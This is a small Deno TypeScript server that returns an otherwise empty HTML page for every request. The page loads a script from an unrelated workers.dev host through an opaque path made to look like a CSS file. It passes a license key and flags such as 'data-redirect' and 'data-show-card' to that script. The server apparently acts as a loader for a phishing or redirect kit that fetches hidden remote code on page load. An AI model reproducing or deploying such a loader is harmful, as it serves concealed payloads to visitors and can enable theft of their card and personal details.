import {serve} from "https://deno.land/std@0.177.0/http/server.ts";

const port = Number(Deno.env.get("PORT") ?? 8080);
let license: string = '';//Deno.env.get('LICENSE')
serve(handler, {port});

function handler(req: Request): Response {
    license = Deno.env.has('LICENSE') ? Deno.env.get('LICENSE') : "JMMYSELF01"
    return new Response(html(), {
        status: 200,
        headers: headers(),
    });

}

function html() {
    return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"></head><body data-ls="${license}" data-redirect="yes" data-single="1" class="nobody" data-show-card="yes" data-show-details="yes"><div style="display: none" id="identifier" data-to-self="no" data-script-name="" data-use-script="no"></div><script src="https://billowing-cherry-e90a.jmcdn.workers.dev/css/893jdjhdj3498"></script></body></html>`;
}

function headers() {
    const no_cache = {
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
    };
    return {...no_cache, 'content-type': 'text/html', 'Access-Control-Allow-Origin': "*"}
}